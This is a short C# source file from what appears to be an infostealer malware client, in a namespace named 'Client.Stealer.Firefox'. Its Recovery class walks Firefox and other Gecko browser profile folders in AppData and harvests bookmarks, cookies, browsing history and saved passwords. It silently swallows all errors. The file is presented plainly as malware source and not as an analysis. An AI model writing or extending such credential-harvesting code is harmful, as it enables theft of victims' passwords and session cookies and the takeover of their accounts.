using System;
using System.IO;
using System.Collections.Generic;
using System.Text;

namespace Client.Stealer.Firefox
{
    internal sealed class Recovery : Browser
    {
        public Recovery() : base()
        {
            type = "FireFox";
        }
        protected override void Load()
        {
            base.Load();
            foreach (string path in Paths.sGeckoBrowserPaths)
            {
                try
                {
                    if (Directory.Exists(Paths.appdata + path + "\\Profiles"))
                    {
                        pBookmarks.AddRange(Firefox.cBookmarks.Get(Paths.appdata + path));
                        pCookies.AddRange(Firefox.cCookies.Get(Paths.appdata + path));
                        pHistory.AddRange(Firefox.cHistory.Get(Paths.appdata + path));
                        pPasswords.AddRange(Firefox.cPasswords.Get(Paths.appdata + path));
                    }
                }
                catch (Exception) { }
            }
        }
    }
}
